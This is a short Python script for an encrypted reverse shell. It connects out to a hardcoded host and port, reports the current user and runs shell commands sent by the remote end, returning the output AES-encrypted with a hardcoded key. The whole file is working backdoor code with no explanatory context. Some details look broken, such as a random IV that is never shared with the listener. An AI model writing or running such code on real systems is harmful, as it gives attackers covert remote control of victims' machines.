
from Crypto.Cipher import AES
import subprocess, socket
import base64
import os

BLOCK_SIZE = 32
PADDING = '0'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
secret = "1^J83UgJnIOQ$GyaI5CD9sh7xjT5%Ubx"
iv = os.urandom(16)
cipher = AES.new(secret, AES.MODE_CFB, iv)
HOST = "172.16.69.139"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Trying to Connect ... !!!")
s.connect((HOST, PORT))
print("Connection EstaBlished")
user_priv = os.popen("whoami").read().strip()
s.send(user_priv.encode())


while 1:
    data = s.recv(1024)
    decrypted = DecodeAES(cipher, data).decode("ISO-8859-1")
    print (decrypted)
    
    if decrypted == "quit":
        break
    
    if decrypted[:5] == "shell":
        proc = subprocess.Popen(decrypted[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        encrypted = EncodeAES(cipher, stdoutput)
        s.send(encrypted)
    else:
        stdoutput = "Invalid Command"
        encrypted = EncodeAES(cipher, stdoutput)
        s.send(encrypted)

    
s.close()
